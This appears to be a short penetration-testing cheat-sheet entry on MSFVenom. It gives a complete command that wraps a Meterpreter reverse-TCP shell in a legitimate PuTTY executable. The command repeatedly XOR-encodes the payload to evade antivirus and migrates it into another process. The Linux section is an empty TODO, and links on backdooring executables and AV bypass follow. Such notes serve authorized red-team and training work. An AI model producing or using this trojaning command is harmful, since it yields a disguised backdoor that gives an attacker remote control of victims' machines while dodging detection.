# 02 - MSFVenom

Search Tag(s): #defense-evasion #backdoor #metasploit-framework

## 2.1 - Windows

```
$ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> exitfunc=thread prependmigrate=true prependmigrateproc=<process.exe> -e x64/xor_dynamic -i 10 -k -x putty_x64.exe -o backdoored_putty_x64.exe
```

## 2.2 - Linux

TODO: Fill in the steps

---
## References

- [Backdooring Putty](https://fluidattacks.com/blog/backdooring-putty/)

- [Patching Windows Executable with the Backdoor](https://www.slideshare.net/midnite_runr/patching-windows-executables-with-the-backdoor-factory)

- [RoseSecurity: Bypass AV Payload Detection](https://github.com/RoseSecurity/Anti-Virus-Evading-Payloads/blob/main/Bypass-AV-Payload-Detection.md)

- [OffSec: Metasploit Unleashed binary Linux Trojan](https://www.offsec.com/metasploit-unleashed/binary-linux-trojan/)